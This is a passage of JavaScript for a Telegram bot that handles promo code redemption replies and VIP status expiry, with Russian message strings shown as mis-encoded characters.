                        bot.sendMessage(msg.chat.id, used ? `‚ùå –ü—Ä–æ–º–æ–∫–æ–¥ ${msg.text} —É–∂–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –≤–∞–º–∏ —Ä–∞–Ω–µ–µ.` : `‚ùå –ü—Ä–æ–º–æ–∫–æ–¥ ${msg.text} —É–∂–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑.\n–î–ª—è –≤—ã—Ö–æ–¥–∞ –∏–∑ —Ä–µ–∂–∏–º–∞ –≤–≤–æ–¥–∞ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ`, {
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: '–í—ã–π—Ç–∏',
                                        callback_data: 'remove_editmode'
                                    }]
                                ]
                            }
                        })
                    }
                } else {
                    bot.sendMessage(msg.chat.id, `‚ùå –ü—Ä–æ–º–æ–∫–æ–¥ ${msg.text} –Ω–µ –Ω–∞–π–¥–µ–Ω\n–î–ª—è –≤—ã—Ö–æ–¥ –∏–∑ —Ä–µ–∂–∏–º–∞ –≤–≤–æ–¥–∞ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ`, {
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: '–í—ã–π—Ç–∏',
                                    callback_data: 'remove_editmode'
                                }]
                            ]
                        }
                    })
                }
            })
        } else {
            bot.sendMessage(msg.chat.id, `–î–ª—è –≤—ã—Ö–æ–¥–∞ –∏–∑ —Ä–µ–∂–∏–º–∞ –≤–≤–æ–¥–∞ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '–í—ã–π—Ç–∏',
                            callback_data: 'remove_editmode'
                        }]
                    ]
                }
            })
        }
    }
    if (user && user.vip) {
        if (VipCheck(user.vipDate)) {
            setTimeout(async () => {
                await data.updateOne({
                    tg_id: msg.chat.id
                }, {
                    vip: false,
                    vipType: '',
                }, {
                    upsert: true
                })
                bot.sendMessage(msg.chat.id, '–í–∞—à VIP —Å—Ç–∞—Ç—É—Å –∑–∞–∫–æ–Ω—á–∏–ª—Å—è, –≤—ã –º–æ–∂–µ—Ç–µ –ø—Ä–∏–æ–±—Ä–µ—Å—Ç–∏ –µ–≥–æ –ø–æ –∫–Ω–æ–ø–∫–µ –Ω–∏–∂–µ', {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: '–ö—É–ø–∏—Ç—å VIP',
                                callback_data: 'show_vip'
                            }]
                        ]
                    }
                })
            }, 200)
        }
    }
})